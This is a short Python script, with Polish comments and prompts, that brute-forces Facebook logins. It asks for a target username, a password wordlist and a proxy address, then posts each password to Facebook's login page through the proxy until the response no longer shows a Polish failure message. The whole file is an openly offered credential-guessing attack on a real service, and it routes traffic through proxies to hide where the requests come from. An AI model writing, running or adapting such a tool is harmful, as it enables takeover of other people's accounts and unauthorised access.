import requests
import time
import random
import re
from requests.auth import HTTPProxyAuth

def verify_password(password, hashed_password):
    # Implementacja funkcji weryfikującej hasło (jeśli jest potrzebna)
    pass

def read_passwords_from_file(filename):
    with open(filename, 'r') as file:
        return file.read().splitlines()

def brute_force(username, fb_id, passwords):
    proxy = input('Podaj adres proxy (format: http://username:password@proxy_ip:proxy_port): ')

    for password in passwords:
        # Wykonaj zapytanie do Facebooka przez serwer proxy
        proxies = {
            "http": proxy,
            "https": proxy,
        }

        response = requests.post('https://www.facebook.com/login.php', data={
            'email': username,
            'password': password,
            'login': 'Log In'
        }, proxies=proxies)

        # Sprawdź odpowiedź
        if "Nieprawidłowe hasło" not in response.text and "Spróbuj ponownie później" not in response.text:
            # Hasło zostało znalezione
            print('Znaleziono hasło:', password)
            return

        # Hasło nie zostało znalezione
        print('Nieprawidłowe hasło:', password)

        # Opóźnij przed kolejną próbą
        time.sleep(2)  # Możesz dostosować czas opóźnienia według potrzeb

def main():
    # Pobierz dane użytkownika
    username = input('Podaj nazwę użytkownika: ')
    fb_id = input('Podaj identyfikator Facebooka: ')

    # Pobierz nazwę pliku z listą haseł
    filename = input('Podaj nazwę pliku z listą haseł: ')

    # Wczytaj listę haseł z pliku
    passwords = read_passwords_from_file(filename)

    # Wykonaj atak siłowy
    brute_force(username, fb_id, passwords)

if __name__ == '__main__':
    main()













